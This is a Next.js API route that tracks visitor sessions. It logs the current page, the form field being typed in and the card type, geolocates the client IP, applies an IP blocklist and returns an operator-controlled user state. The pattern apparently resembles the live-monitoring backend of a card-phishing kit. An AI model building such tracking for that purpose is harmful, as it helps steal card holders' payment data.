import { NextRequest, NextResponse } from 'next/server';
import { updateSession, getSession, clearUserState } from '@/lib/session-store';
import { isIpBlocked } from '@/lib/config-storage';

function getClientIP(req: NextRequest): string {
  const forwarded = req.headers.get('x-forwarded-for');
  if (forwarded) return forwarded.split(',')[0].trim();
  const realIp = req.headers.get('x-real-ip');
  if (realIp) return realIp;
  const clientIp = req.headers.get('cf-connecting-ip');
  if (clientIp) return clientIp;
  return 'Unknown';
}

async function getGeolocation(ip: string): Promise<{ country?: string; city?: string; postal_code?: string }> {
  if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') {
    return { country: 'Local', city: 'Local', postal_code: 'Local' };
  }

  // Try ip-api.com (reliable and no key needed for simple usage)
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    if (response.ok) {
      const data = await response.json();
      if (data.status === 'success') {
        return {
          country: data.country || 'Unknown',
          city: data.city || 'Unknown',
          postal_code: data.zip || 'Unknown'
        };
      }
    }
  } catch (e) {
    console.error('ip-api.com failed');
  }

  // Fallback to ipapi.co
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    if (response.ok) {
      const data = await response.json();
      return {
        country: data.country_name || 'Unknown',
        city: data.city || 'Unknown',
        postal_code: data.postal || 'Unknown'
      };
    }
  } catch (e) {
    console.error('ipapi.co failed');
  }

  return { country: 'Unknown', city: 'Unknown', postal_code: 'Unknown' };
}

export async function GET(req: NextRequest) {
  try {
    const { searchParams } = new URL(req.url);
    const sessionId = searchParams.get('sessionId');
    if (!sessionId) return NextResponse.json({ error: 'Missing sessionId' }, { status: 400 });
    const session = getSession(sessionId);
    if (!session) return NextResponse.json({ error: 'Session not found' }, { status: 404 });
    return NextResponse.json(session);
  } catch (error) {
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}

export async function POST(req: NextRequest) {
  try {
    const { sessionId, currentPage, userAgent, typingField, cardType } = await req.json();

    if (!sessionId) {
      return NextResponse.json({ error: 'Missing sessionId' }, { status: 400 });
    }

    const clientIP = getClientIP(req);
    if (isIpBlocked(clientIP)) {
      return NextResponse.json({ userState: 'block', blocked: true });
    }

    const updateData: any = { currentPage };
    if (typingField !== undefined) updateData.typingField = typingField;
    if (cardType !== undefined) updateData.cardType = cardType;

    const existing = getSession(sessionId);
    if (!existing || !existing.country || existing.country === 'Unknown') {
      const geo = await getGeolocation(clientIP);
      updateData.ip = clientIP;
      updateData.country = geo.country;
      updateData.city = geo.city;
      updateData.postalCode = geo.postal_code;
    }

    const session = updateSession(sessionId, updateData);
    return NextResponse.json({ userState: session.userState });
  } catch (error) {
    console.error('Session update error:', error);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}

export async function DELETE(req: NextRequest) {
  try {
    const { sessionId } = await req.json();
    if (!sessionId) return NextResponse.json({ error: 'Missing sessionId' }, { status: 400 });
    const session = clearUserState(sessionId);
    if (!session) return NextResponse.json({ error: 'Session not found' }, { status: 404 });
    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}
